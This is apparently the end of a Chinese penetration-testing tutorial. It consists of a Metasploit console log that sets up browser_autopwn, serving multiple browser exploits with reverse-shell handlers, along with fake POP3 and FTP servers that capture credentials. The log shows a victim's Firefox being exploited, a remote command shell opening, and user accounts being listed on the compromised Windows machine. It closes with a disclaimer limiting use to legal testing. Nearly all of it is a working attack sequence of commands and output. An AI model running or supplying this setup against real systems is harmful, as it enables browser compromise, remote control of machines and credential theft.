+ -- --=[ 18 encoders - 6 nops 
=[ 79 aux 
resource> load db_sqlite3
[*] Successfully loaded plugin: db_sqlite3 
resource> db_create /root/karma.db 
[*] The specified database already exists, connecting [*] Successfully connected to the database 
[*] File: /root/karma.db 
resource> use auxiliary/server/browser_autopwn resource> setg AUTOPWN_HOST 172.16.1.207 
AUTOPWN_HOST => 172.16.1.207 
resource> setg AUTOPWN_PORT 55550 
AUTOPWN_PORT => 55550 
resource> setg AUTOPWN_URI /ads 
AUTOPWN_URI => /ads 
resource> set LHOST 172.16.1.207 
LHOST => 172.16.1.207 
resource> set LPORT 45000 
LPORT => 45000 
resource> set SRVPORT 55550 
SRVPORT => 55550 
resource> set URIPATH /ads 
URIPATH => /ads 
resource> run 
[*]    Starting exploit modules on host 172.16.1.207...
[*]    Started reverse handler
[*]    Using URL: http://0.0.0.0:55550/exploit/multi/browser/mozilla_compareto
[*]    Local IP: http://127.0.0.1:55550/exploit/multi/browser/mozilla_compareto
[*]    Server started.
[*]    Started reverse handler
[*]    Using URL: http://0.0.0.0:55550/exploit/multi/browser/mozilla_navigatorjava
[*]    Local IP: http://127.0.0.1:55550/exploit/multi/browser/mozilla_navigatorjava
[*]    Server started.
[*]    Started reverse handler
[*]    Using URL: http://0.0.0.0:55550/exploit/multi/browser/firefox_queryinterface
[*]    Local IP: http://127.0.0.1:55550/exploit/multi/browser/firefox_queryinterface
[*]    Server started.
[*]    Started reverse handler
[*]    Using URL: http://0.0.0.0:55550/exploit/windows/browser/apple_quicktime_rtsp
[*]    Local IP: http://127.0.0.1:55550/exploit/windows/browser/apple_quicktime_rtsp
[*]    Server started.
[*]    Started reverse handler
[*]    Using URL: http://0.0.0.0:55550/exploit/windows/browser/novelliprint_getdriversettings
[*]    Local IP: http://127.0.0.1:55550/exploit/windows/browser/novelliprint_getdriversettings
[*]    Server started.
[*]    Started reverse handler
[*]    Using URL: http://0.0.0.0:55550/exploit/windows/browser/ms03_020_ie_objecttype
[*]    Local IP: http://127.0.0.1:55550/exploit/windows/browser/ms03_020_ie_objecttype
[*]    Server started.
[*]    Started reverse handler
[*]    Using URL: http://0.0.0.0:55550/exploit/windows/browser/ie_createobject
[*]    Local IP: http://127.0.0.1:55550/exploit/windows/browser/ie_createobject
[*] Server started. 
[*] Started reverse handler 
[*] Using URL: http://0.0.0.0:55550/exploit/windows/browser/ms06_067_keyframe [*] Local IP: http://127.0.0.1:55550/exploit/windows/browser/ms06_067_keyframe [*] Server started. 
[*] Started reverse handler 
[*] Using URL: http://0.0.0.0:55550/exploit/windows/browser/ms06_071_xml_core [*] Local IP: http://127.0.0.1:55550/exploit/windows/browser/ms06_071_xml_core [*] Server started. 
[*] Started reverse handler 
[*] Server started. 
[*] Using URL: http://0.0.0.0:55550/ads 
[*] Local IP: http://127.0.0.1:55550/ads 
[*] Server started. 
[*] Auxiliary module running as background job resource> use auxiliary/server/capture/pop3 resource> set SRVPORT 110 
SRVPORT => 110 
resource> set SSL false 
SSL => false 
resource> run 
[*] Server started. 
[*] Auxiliary module running as background job resource> use auxiliary/server/capture/pop3 resource> set SRVPORT 995 
SRVPORT => 995 
resource> set SSL true 
SSL => true 
resource> run 
[*] Server started. 
[*] Auxiliary module running as background job resource> use auxiliary/server/capture/ftp 
resource> run 
[*] Server started. 
[*] Sending Firefox location.QueryInterface() Code Execution to 10.0.0.252:1493... [*] Command shell session 2 opened (10.0.0.1:45001 -> 10.0.0.252:1507) 
msf auxiliary(http) > sessions -i 2 
[*] Starting interaction with 2... 
Microsoft Windows XP [版本 5.1.2600] 
(C) 版权所有 1985-2001 Microsoft Corp. 
D:\Mozilla Firefox> cd ..
D:\> net user 
\\CZY 的用户帐户
__vmware_user__                              Administrator                                     ASPNET
Guest                                               HelpAssistant                                    IUSR_CWH
IWAM_CZY                    CZY                                       SUPPORT_388945a0
命令成功完成。
[0x11] - 旅程的尾声
操作都是处于 Linux 环境下完成的，无论如何，我希望它对你有所帮助。
本文是针对交流技术和合法的渗透测试目的而写，作者不负责使用此文件内容所带来的损害。如果你想对其他人的系统使用这方面的技术，则必须要求对方同意或合法的渗透测试。

